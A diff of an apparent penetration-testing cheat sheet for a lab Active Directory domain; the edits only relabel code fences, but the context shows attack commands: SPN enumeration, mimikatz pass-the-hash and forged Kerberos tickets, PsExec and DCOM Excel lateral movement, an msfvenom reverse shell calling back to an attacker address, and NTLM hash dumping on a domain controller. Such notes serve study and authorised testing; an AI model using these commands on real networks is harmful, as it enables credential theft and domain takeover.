@@ -505,13 +505,13 @@ ss -antp | grep "<out_port_number>"
 
 ## Active Directory
 
-```ps
+```powershell
 [System.DirecrotyServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
 ### Get all Service Principal Names (SPN's)
 
-```ps
+```powershell
 cls
 $search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
 $search.filter = "(servicePrincipalName=*)"
@@ -577,7 +577,7 @@ sekurlsa::tickets
 
 ### Display kerberos service ticket
 
-```ps
+```powershell
 PS C:\Windows\system32> Add-Type -AssemblyName System.IdentityModel
 PS C:\Windows\system32> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWe
 bServer.corp.com'
@@ -640,13 +640,13 @@ mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /domain:corp.com /ntl
 
 and a powershell is spawned. To check our kerberos tickets:
 
-```ps
+```powershell
 > klist
 ```
 
 Now we can log into the domain controller using psexec like so:
 
-```ps
+```powershell
 PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
 ```
 
@@ -654,7 +654,7 @@ PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
 
 First find the SID:
 
-```ps
+```powershell
 PS C:\Tools\active_directory> whoami /user
 
 USER INFORMATION
@@ -667,14 +667,14 @@ PS C:\Tools\active_directory> .\mimikatz.exe
 ```
 
 Now purge all existing tickets
-```ps
+```powershell
 mimikatz # kerberos::purge
 mimikatz # kerberos::list
 ```
 
 Now create the new ticket with the sid's last portion cut off and the rc4 from the NTLM hash
 
-```ps
+```powershell
 mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
 ```
 
@@ -686,7 +686,7 @@ First let's view the available methods and find if the `run` method is available
 
 Ip addresss of remote workstation: 172.16.194.5
 
-```ps
+```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.194.5"))
 $com | Get-Member
 ```
@@ -698,7 +698,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.194.10 LPORT=5555 -f vba-psh
 cat new_payload.txt
 ```
 copy it to the remote computer
-```ps
+```powershell
 $LocalPath = "C:\Users\jeff_admin\Documents\myexcel.xls"
 $RemotePath = "\\172.16.194.5\c$\myexcel.xls"
 [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
@@ -706,7 +706,7 @@ $RemotePath = "\\172.16.194.5\c$\myexcel.xls"
 
 Now open the excel file from our machine by creating a system profile on the remote machine then running it
 
-```ps
+```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.194.5"))
 
 $Path = "\\172.16.194.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
@@ -724,7 +724,7 @@ $com.Run("AutoOpen")
 
 Go into the domain controller and grab the NTLM hash
 
-```ps
+```powershell
 # On the domain controller:
 C:\Tools>mimikatz.exe
 
@@ -749,7 +749,7 @@ NTLM : fc274a94b36874d2560a7bd332604fab
 Now on the workstation:
 
 Find the SID first using `whoami /user` without the last part after the `-`.
-```ps
+```powershell
 C:\Tools>mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04
